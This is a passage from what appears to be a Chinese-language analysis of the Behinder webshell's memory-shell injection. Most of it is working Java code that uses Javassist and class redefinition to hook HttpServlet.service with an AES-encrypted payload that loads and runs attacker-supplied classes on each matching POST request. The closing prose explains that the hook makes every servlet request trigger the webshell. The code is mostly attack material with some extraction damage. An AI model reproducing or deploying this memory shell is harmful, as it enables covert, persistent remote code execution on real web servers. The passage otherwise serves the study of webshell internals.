               String path = new String(base64decode(args.split("\\|")[0]));
               String key = new String(base64decode(args.split("\\|")[1]));
               shellCode = String.format(shellCode, path, key);
               if (targetClassName.equals("jakarta.servlet.http.HttpServlet")) {
                  shellCode = shellCode.replace("javax.servlet", 
"jakarta.servlet");
               }
               ClassClassPath classPath = new ClassClassPath(cls);
               cPool.insertClassPath(classPath);
               cPool.importPackage("java.lang.reflect.Method");
               cPool.importPackage("javax.crypto.Cipher");
               List paramClsList = new ArrayList();
               Iterator var21 = ((List)
((Map)targetClasses.get(targetClassName)).get("paramList")).iterator();
               String methodName;
               while(var21.hasNext()) {
                  methodName = (String)var21.next();
                  paramClsList.add(cPool.get(methodName));
               }
               CtClass cClass = cPool.get(targetClassName);
               methodName = 
((Map)targetClasses.get(targetClassName)).get("methodName").toString();
               CtMethod cMethod = cClass.getDeclaredMethod(methodName, 
(CtClass[])paramClsList.toArray(new CtClass[paramClsList.size()]));
               cMethod.insertBefore(shellCode);
               cClass.detach();
               data = cClass.toBytecode();
               inst.redefineClasses(new ClassDefinition[]{new 
ClassDefinition(cls, data)});
            } catch (Exception var24) {
               var24.printStackTrace();
            } catch (Error var25) {
               var25.printStackTrace();
            }
         }
      }
javax.servlet.http.HttpServletRequest request = (javax.servlet.ServletRequest) 
$1;
        javax.servlet.http.HttpServletResponse response = 
(javax.servlet.ServletResponse) $2;
        javax.servlet.http.HttpSession session = request.getSession();
        String pathPattern = "%s";
        if (request.getRequestURI().matches(pathPattern)) {
            java.util.Map obj = new java.util.HashMap();
            obj.put("request", request);
            obj.put("response", response);
            obj.put("session", session);
            ClassLoader loader = this.getClass().getClassLoader();
            if (request.getMethod().equals("POST")) {
                try {
                    String k = "%s";
                    session.putValue("u", k);
                    java.lang.ClassLoader systemLoader = 
java.lang.ClassLoader.getSystemClassLoader();
                    Class cipherCls = 
systemLoader.loadClass("javax.crypto.Cipher");
                    Object c = cipherCls.getDeclaredMethod("getInstance", new 
Class[]{String.class}).invoke((java.lang.Object) cipherCls, new Object[]
{"AES"});
                    Object keyObj = 
systemLoader.loadClass("javax.crypto.spec.SecretKeySpec").getDeclaredConstructor
(new Class[]{byte[].class, String.class}).newInstance(new Object[]{k.getBytes(), 
"AES"});
                    ;
                    java.lang.reflect.Method initMethod = 
cipherCls.getDeclaredMethod("init", new Class[]{int.class, 
systemLoader.loadClass("java.security.Key")});
                    initMethod.invoke(c, new Object[]{new Integer(2), keyObj});
                    java.lang.reflect.Method doFinalMethod = 
cipherCls.getDeclaredMethod("doFinal", new Class[]{byte[].class});
                    byte[] requestBody = null;
                    try {
                        Class Base64 = 
loader.loadClass("sun.misc.BASE64Decoder");
                        Object Decoder = Base64.newInstance();
                        requestBody = (byte[]) 
Decoder.getClass().getMethod("decodeBuffer", new Class[]
{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});
                    } catch (Exception ex) {
                        Class Base64 = loader.loadClass("java.util.Base64");
                        Object Decoder = Base64.getDeclaredMethod("getDecoder", 
new Class[0]).invoke(null, new Object[0]);
                        requestBody = (byte[]) 
Decoder.getClass().getMethod("decode", new Class[]
{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});
                    }
                    byte[] buf = (byte[]) doFinalMethod.invoke(c, new Object[]
{requestBody});
                    java.lang.reflect.Method defineMethod = 
java.lang.ClassLoader.class.getDeclaredMethod("defineClass", new Class[]
{String.class, java.nio.ByteBuffer.class, 
java.security.ProtectionDomain.class});
                    defineMethod.setAccessible(true);
                    java.lang.reflect.Constructor constructor = 
java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]
{java.lang.ClassLoader.class});
                    constructor.setAccessible(true);
                    java.lang.ClassLoader cl = (java.lang.ClassLoader) 
constructor.newInstance(new Object[]{loader});
新建一个 servlet ，然后 Hook HttpServlet
                    java.lang.Class c = (java.lang.Class) 
defineMethod.invoke((java.lang.Object) cl, new Object[]{null, 
java.nio.ByteBuffer.wrap(buf), null});
                    c.newInstance().equals(obj);
                } catch (java.lang.Exception e) {
                    e.printStackTrace();
                } catch (java.lang.Error error) {
                    error.printStackTrace();
                }
                return;
            }
        }
public class agentMemshell extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) 
throws ServletException, IOException {
        String shellCode = "javax.servlet.http.HttpServletRequest request=
(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse 
response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession 
session = request.getSession();\nString pathPattern=\"%s\";\nif 
(request.getRequestURI().matches(pathPattern))\n{\n\tjava.util.Map obj=new 
java.util.HashMap();\n\tobj.put(\"request\",request);\n\tobj.put(\"response\",re
sponse);\n\tobj.put(\"session\",session);\n    ClassLoader 
loader=this.getClass().getClassLoader();\n\tif 
(request.getMethod().equals(\"POST\"))\n\t{\n\t\ttry\n\t\t{\n\t\t\tString 
k=\"%s\";\n\t\t\tsession.putValue(\"u\",k);\n\t\t\t\n\t\t\tjava.lang.ClassLoader 
systemLoader=java.lang.ClassLoader.getSystemClassLoader();\n\t\t\tClass 
cipherCls=systemLoader.loadClass(\"javax.crypto.Cipher\");\n\n\t\t\tObject 
c=cipherCls.getDeclaredMethod(\"getInstance\",new Class[]
{String.class}).invoke((java.lang.Object)cipherCls,new Object[]
{\"AES\"});\n\t\t\tObject 
keyObj=systemLoader.loadClass(\"javax.crypto.spec.SecretKeySpec\").getDeclaredCo
nstructor(new Class[]{byte[].class,String.class}).newInstance(new Object[]
{k.getBytes(),\"AES\"});;\n\t\t\t       \n\t\t\tjava.lang.reflect.Method 
initMethod=cipherCls.getDeclaredMethod(\"init\",new Class[]
{int.class,systemLoader.loadClass(\"java.security.Key\")});\n\t\t\tinitMethod.in
voke(c,new Object[]{new Integer(2),keyObj});\n\n\t\t\tjava.lang.reflect.Method 
doFinalMethod=cipherCls.getDeclaredMethod(\"doFinal\",new Class[]
{byte[].class});\n            byte[] requestBody=null;\n            try {\n       
             Class Base64 = loader.loadClass(\"sun.misc.BASE64Decoder\");\n\t\t\t 
       Object Decoder = Base64.newInstance();\n                    requestBody=
(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\", new Class[]
{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n 
               } catch (Exception ex) \n                {\n                    
Class Base64 = loader.loadClass(\"java.util.Base64\");\n                    
Object Decoder = Base64.getDeclaredMethod(\"getDecoder\",new 
Class[0]).invoke(null, new Object[0]);\n                    requestBody=
(byte[])Decoder.getClass().getMethod(\"decode\", new Class[]
{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n 
               }\n\t\t\t\t\t\t\n\t\t\tbyte[] buf=
(byte[])doFinalMethod.invoke(c,new Object[]
{requestBody});\n\t\t\tjava.lang.reflect.Method 
defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new 
Class[]
{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\
n\t\t\tdefineMethod.setAccessible(true);\n\t\t\tjava.lang.reflect.Constructor 
constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new 
Class[]
{java.lang.ClassLoader.class});\n\t\t\tconstructor.setAccessible(true);\n\t\t\tj
ava.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new 
Object[]{loader});\n\t\t\tjava.lang.Class  c=
(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]
{null,java.nio.ByteBuffer.wrap(buf),null});\n\t\t\tc.newInstance().equals(obj);\
n\t\t}\n\n\t\tcatch(java.lang.Exception e)\n\t\t{\n\t\t   
e.printStackTrace();\n\t\t}\n\t\tcatch(java.lang.Error 
error)\n\t\t{\n\t\terror.printStackTrace();\n\t\t}\n\t\treturn;\n\t}\t\n}\n";
        Map targetClasses = new HashMap();
        Map targetClassJavaxMap = new HashMap();
        targetClassJavaxMap.put("methodName", "service");
        List paramJavaxClsStrList = new ArrayList();
        paramJavaxClsStrList.add("javax.servlet.ServletRequest");
        paramJavaxClsStrList.add("javax.servlet.ServletResponse");
        targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
        targetClasses.put("javax.servlet.http.HttpServlet", 
targetClassJavaxMap);
        targetClasses.put("javax.servlet.http.HttpServlet", 
targetClassJavaxMap);
        Class cls = null;
        try {
            ClassPool cPool = ClassPool.getDefault();
            cls = Class.forName("javax.servlet.http.HttpServlet");
            String targetClassName = cls.getName();
            ClassClassPath classPath = new ClassClassPath(cls);
            cPool.insertClassPath(classPath);
            cPool.importPackage("java.lang.reflect.Method");
            cPool.importPackage("javax.crypto.Cipher");
            List paramClsList = new ArrayList();
            Iterator var21 = ((List)
((Map)targetClasses.get(targetClassName)).get("paramList")).iterator();
            String methodName;
            while(var21.hasNext()) {
                methodName = (String)var21.next();
                paramClsList.add(cPool.get(methodName));
            }
            CtClass cClass = cPool.get(targetClassName);
            methodName = 
((Map)targetClasses.get(targetClassName)).get("methodName").toString();
            CtMethod cMethod = cClass.getDeclaredMethod(methodName, 
(CtClass[])paramClsList.toArray(new CtClass[paramClsList.size()]));
            cMethod.insertBefore(shellCode);
            cClass.detach();
            byte[] data = new byte[0];
            data = cClass.toBytecode();
            byteToFile(data);
        } catch (ClassNotFoundException | NotFoundException | 
CannotCompileException e) {
            e.printStackTrace();
        }
    }
    public static void byteToFile(byte[] bytes) throws IOException{  //字节转文件
        if(bytes.length == 0){
            return;
        }
        File file = new File("D:\\Java\\tomcat\\apache-tomcat-8.5.68-
src\\java\\lagou\\edu\\servlet\\httpServelt.class");
        FileOutputStream fileOutputStream = new FileOutputStream(file);
        BufferedOutputStream bufferedOutputStream = new 
BufferedOutputStream(fileOutputStream);
        bufferedOutputStream.write(bytes);
        bufferedOutputStream.close();
        fileOutputStream.close();
    }
}
文件对比
HttpServlet  在实现 Servlet  接口时，覆写了 service  方法，该方法体内的代码会自动判断
用户的请求方式，如为 GET  请求，则调用 HttpServlet  的 doGet  方法，如为 Post  请求，则
调用 doPost  方法。因此，开发人员在编写 Servlet 时，通常只需要覆写 doGet  或 doPost  方
法，而不要去覆写 service  方法，此处通过 Hook HttpServlet 修改了代码的执行逻辑，之后每
次访问 servlet 都会先触发 webshell 。到此内存马的内容基本分析完了，整个冰蝎的源码也有
了一个大概的了解。